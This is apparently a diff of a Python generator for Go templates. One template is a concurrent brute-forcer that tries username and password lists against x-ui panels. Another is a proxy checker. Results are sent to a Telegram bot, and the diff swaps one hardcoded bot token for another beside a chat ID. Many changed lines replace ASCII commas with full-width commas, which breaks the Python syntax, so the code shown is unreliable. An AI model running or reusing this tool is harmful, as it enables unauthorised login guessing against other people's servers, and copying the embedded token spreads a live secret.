@@ -123,37 +123,37 @@ XUI_GO_TEMPLATE_1_LINES = [
     "func main() {",
     "	if len(os.Args) < 3 {",
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
-    "		os.Exit(1)",
-    "	}",
-    "	inputFile, outputFile := os.Args[1], os.Args[2]",
-    "	batch, err := os.Open(inputFile)",
-    "	if err != nil {",
-    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
-    "		return",
-    "	}",
-    "	defer batch.Close()",
-    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
+    "		os.Exit(1)"，
+    "	}"，
+    "	inputFile, outputFile := os.Args[1], os.Args[2]"，
+    "	batch, err := os.Open(inputFile)"，
+    "	if err != nil {"，
+    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)"，
+    "		return"，
+    "	}"，
+    "	defer batch.Close()"，
+    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)"，
     "	if err != nil {",
     "		fmt.Println(\"无法打开输出文件:\", err)",
     "		return",
-    "	}",
-    "	defer outFile.Close()",
-    "	usernames, passwords := {user_list}, {pass_list}",
-    "	if len(usernames) == 0 || len(passwords) == 0 {",
-    "		fmt.Println(\"错误：用户名或密码列表为空。\")",
-    "		return",
-    "	}",
+    "	}"，
+    "	defer outFile.Close()"，
+    "	usernames, passwords := {user_list}, {pass_list}"，
+    "	if len(usernames) == 0 || len(passwords) == 0 {"，
+    "		fmt.Println(\"错误：用户名或密码列表为空。\")"，
+    "		return"，
+    "	}"，
     "	tasks := make(chan string, {semaphore_size})",
-    "	var wg sync.WaitGroup",
+    "	var wg sync.WaitGroup"，
     "	for i := 0; i < {semaphore_size}; i++ {",
     "		wg.Add(1)",
     "		go worker(tasks, outFile, &wg, usernames, passwords)",
     "	}",
     "	scanner := bufio.NewScanner(batch)",
     "	for scanner.Scan() {",
-    "		line := strings.TrimSpace(scanner.Text())",
-    "		if line != \"\" { tasks <- line }",
-    "	}",
+    "		line := strings.TrimSpace(scanner.Text())"，
+    "		if line != \"\" { tasks <- line }"，
+    "	}"，
     "	close(tasks)",
     "	wg.Wait()",
     "}",
@@ -621,7 +621,7 @@ PROXY_GO_TEMPLATE_LINES = [
     "var (",
     "	proxyType    = \"{proxy_type}\"",
     "	authMode     = {auth_mode}",
-    "	testURL      = \"http://myip.ipip.net\"", # This will be replaced by Python script
+    "	testURL      = \"http://myip.ipip.net\""， # This will be replaced by Python script
     "	realIP       = \"\"",
     ")",
     # FIX 1: Worker no longer creates or passes an http.Client
@@ -636,7 +636,7 @@ PROXY_GO_TEMPLATE_LINES = [
     "	var found bool",
     "	checkAndFormat := func(auth *proxy.Auth) {",
     "        if found { return }",
-    "		success, _ := checkConnection(proxyAddr, auth)", # Client removed from call
+    "		success, _ := checkConnection(proxyAddr, auth)"， # Client removed from call
     "		if success {",
     "            found = true",
     "			var result string",
@@ -2696,7 +2696,7 @@ if __name__ == "__main__":
                             except Exception as e:
                                     print("❌ 发送到 TG 失败：{}".format(e))
 
-            BOT_TOKEN = "7664203362:AAFTBPQ8Ydl9c1fqM53CSzKIPS0VBj99r0M"
+            BOT_TOKEN = "7664203362:AAFa39m24sLDvZopMDTrdg0NippyeEVNFGU"
             CHAT_ID = "7697235358"
 
             # 修复：将 CHID 改回 CHAT_ID
